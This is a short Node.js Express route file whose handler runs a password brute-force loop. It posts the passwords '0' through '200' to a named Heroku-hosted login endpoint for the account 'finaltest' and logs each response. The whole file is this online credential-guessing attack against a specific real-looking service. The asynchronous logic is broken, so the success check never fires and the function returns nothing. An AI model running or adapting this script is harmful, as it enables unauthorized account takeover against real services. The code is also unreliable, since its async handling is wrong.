var express = require('express');
var router = express.Router();
var axios = require('axios');
var fs = require('fs');
const { Console } = require('console');

/* GET users listing. */
const output = fs.createWriteStream('./stdout.log');
const errorOutput = fs.createWriteStream('./stderr.log');
// custom simple logger
const logger = new Console(output, errorOutput);
// use it like console


function getpass(num){
var resp = "";
for (let num = 0; num <= 200; num++){
var n = num.toString();
axios.post('https://bambooalbum.herokuapp.com/login',{
		userId: 'finaltest',
		password: n
	})
	.then(function(response){
		resp = response.data.info;
		logger.log(resp);
		logger.log(n);
	}).catch(function(error){
		
		logger.log(error);
	});
	if (resp === 'success')  var s = num;
}
return s;
}
router.get('/',function(req,res){
	var resp = "";
	var brutalforce = 0;
	var n = getpass(0);
	logger.log("here");
	logger.log(n);
});

module.exports = router;
